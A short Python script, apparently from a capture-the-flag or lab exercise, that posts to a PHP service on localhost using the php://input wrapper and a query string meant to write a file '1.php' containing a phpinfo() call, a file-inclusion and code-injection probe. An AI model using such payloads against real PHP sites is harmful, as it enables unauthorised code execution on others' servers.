#!/usr/bin/env pyhton3
# -*- coding:utf-8 -*-

import requests

url = "http://127.0.0.1:8094/?file=php://input&name=1.php&data=<?php phpinfo();"
rep = requests.post(url, data='Hello World')
print(rep.text)
